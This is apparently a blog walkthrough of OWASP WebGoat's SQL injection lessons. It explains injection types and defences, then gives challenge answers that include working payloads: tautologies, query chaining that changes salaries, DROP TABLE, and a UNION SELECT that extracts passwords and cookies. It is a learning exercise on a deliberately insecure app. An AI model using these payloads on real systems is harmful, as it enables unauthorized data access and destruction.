## **OWASP Top 10 WebGoat - Injection**

<ins>**Introduction**</ins>

*WebGoat* is a deliberately insecure web application maintained by *OWASP* designed to teach web application security lessons. More information including how to download and run WebGoat can be found here on the projects [GitHub](https://github.com/WebGoat/WebGoat).
This is post eight of a series where I will be doing WebGoats challenges to further my understanding of the OWASP Top 10 and web application security as a whole. I have started from the number 10 and am working my way backwards to number 1.

---

<ins> **\#4. Injection** </ins>

Injection attacks happen when untrusted data is sent to a code interpreter through a form input or some other data submission. For example An attacker could enter SQL database code into a form that expects a plaintext username. If that form input is not properly secured this would result in that SQL code being executed. 

The concept is identical among all interpreters. Source code review is the best method of detecting if applications are vulnerable to injections. Automated testing of all parameters, headers, URL, cookies, JSON, and XML data inputs is strongly encouraged. Organizations can include static, dynamic and interactive application security testing tools into the CI/CD pipeline to identify introduced injections flaws before deployment. 

**Common Types of Injection Attacks:**

* *SQL Injection:* Is a type of web application vulnerability where an attacker can manipulate the input parameters of a SQL query to execute unintended commands or gain unauthorized database access. It occurs when user supplied input is not properly validated or sanitized before being used in a SQL query.
* *Cross-Site Scripting (XSS)*: Is an injection attack where malicious scripts are injected into trusted web applications, which are then executed by a victims browser when they visit it. It occurs when untrusted data is displayed on a web page without proper sanitization or validation.  
* *Command Injection:* These attacks occur when an attacker injects malicious commands into a system command-line interface or shell. This can happen if user supplied data is not properly validated or sanitized before being used in a command execution function. 
* *XML Injection:* These attacks exploit vulnerabilities in applications that process XML input. Attackers can inject malicious XML code to manipulate the applications behavior, gain unauthorized access, or retrieve sensitive information. 
* *File Inclusion/Path Traversal:* File inclusion and Path Traversal attacks involve manipulating file or resource inclusion mechanism to access files or directories that should be not accessible.  

**Preventing injection requires keeping data separate from commands and queries:**

* The preferred option is to use a safe API, which avoids using the interpreter entirely, provides a parameterized interface, or migrates to Object Relational Mapping tools. 
* Use positive server-side input validation. 
* For any residual dynamic queries escape special characters using the specific escape syntax for that interpreter. 
* Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection. 
* Implementing a Web Application Firewall can add a layer of protection. WAFs can analyze incoming requests, detect attack patters, and block or filter out malicious input. 
* Conduct regular security testing such a penetration testing and code reviews.  

---

<ins> *WebGoat SQL Injection Challenges** </ins>

**Challenge 1*

*What is SQL?*

![challenge1](/docs/assets/images/webgoat/injection/inject01.png)

![challenge 1 cont](/docs/assets/images/webgoat/injection/inject02.png)

`SELECT department FROM employees WHERE first_name='Bob' `

![Complete1](/docs/assets/images/webgoat/injection/inject03.png)

**Challenge 2**

*Data Manipulation Language*

![challenge2](/docs/assets/images/webgoat/injection/inject04.png)

`UPDATE employees SET department='Sales' WHERE first_name='Tobi' `


![complete3](/docs/assets/images/webgoat/injection/inject05.png)

**Challenge 3**

*Data Definition Language*

![challenge3](/docs/assets/images/webgoat/injection/inject06.png)

`ALTER TABLE employees ADD phone varchar(20)`

![complete3](/docs/assets/images/webgoat/injection/inject07.png)

**Challenge 4**

*Data Control Language*

![challenge4](/docs/assets/images/webgoat/injection/inject08.png)

`GRANT SELECT, INSERT, UPDATE, DELETE ON grant_rights TO unauthorized_user; `

![complete4](/docs/assets/images/webgoat/injection/inject09.png)

**Challenge 5**

*String SQL INjection*

![challenge5](/docs/assets/images/webgoat/injection/inject10.png)

`SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'`

As the explanation above states this injection worked because one will always equal to one so the statement evaluates as true regardless of what came before it.  

**Challenge 6**

*Numeric SQL Injection*

![challenge6](/docs/assets/images/webgoat/injection/inject11.png)

`SELECT * From user_data WHERE Login_Count = 0 and userid= 0 OR 1=1`

**Challenge 7**

*It Is Your Turn!*

![challenge7](/docs/assets/images/webgoat/injection/inject12.png)

```
Employee Name: A
Authentication TAN: ' OR '1'='1
```

**Challenge 8 **

*Compromising Integrity with Query Chaining*

![challenge8](/docs/assets/images/webgoat/injection/inject13.png)

```
Employee Name: A
Authentication TAN: '; UPDATE employees SET salary=99999 WHERE first_name='John 
```

**Challenge 9**

*Compromising Availability*

![challenge9](/docs/assets/images/webgoat/injection/inject14.png)

`%'; DROP TABLE access_log;-- `

**Challenge 10**

*Pulling Data From Other Tables*

![challenge10](/docs/assets/images/webgoat/injection/inject15.png)

```
Name: '; SELECT * FROM user_system_data;-- or ' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;-- 
Password: passW0rD 
```

---

<ins> **WebGoat Path Traversal Challenges** </ins>


